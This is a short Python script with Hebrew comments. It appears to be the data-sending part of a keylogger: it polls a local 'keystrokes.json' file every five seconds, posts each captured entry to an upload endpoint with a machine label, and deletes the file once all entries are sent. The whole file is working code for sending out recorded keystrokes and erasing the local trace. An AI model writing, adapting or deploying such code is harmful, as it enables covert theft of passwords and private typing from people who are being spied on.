import json
import requests
import os
import time

SERVER_URL = "http://127.0.0.1:5000/api/upload"
FILENAME = "keystrokes.json"

def send_data():
    if not os.path.exists(FILENAME):
        print("[LOG] No data file found")
        return False

    try:
        with open(FILENAME, "r", encoding="utf-8") as f:
            file_data = json.load(f)

        if not file_data:
            print("[LOG] No data to send")
            return False

        for entry in file_data:
            payload = {
                "machine": "User-PC",
                "data": entry["encrypted"]
            }
            
            response = requests.post(SERVER_URL, json=payload)
            print(f"[LOG] Server response: {response.status_code}")
            
            if response.status_code == 200:
                print("[LOG] Data sent successfully")
            else:
                print(f"[ERROR] Failed to send data: {response.text}")
                return False

        # מוחק את הקובץ רק אם כל הנתונים נשלחו בהצלחה
        os.remove(FILENAME)
        print("[LOG] Data file deleted after successful transmission")
        return True

    except Exception as e:
        print(f"[ERROR] Failed to send data: {e}")
        return False

def monitor_and_send():
    """מנטר את הקובץ ושולח נתונים באופן אוטומטי"""
    while True:
        if os.path.exists(FILENAME):
            send_data()
        time.sleep(5)  # בדיקה כל 5 שניות

if __name__ == "__main__":
    monitor_and_send()
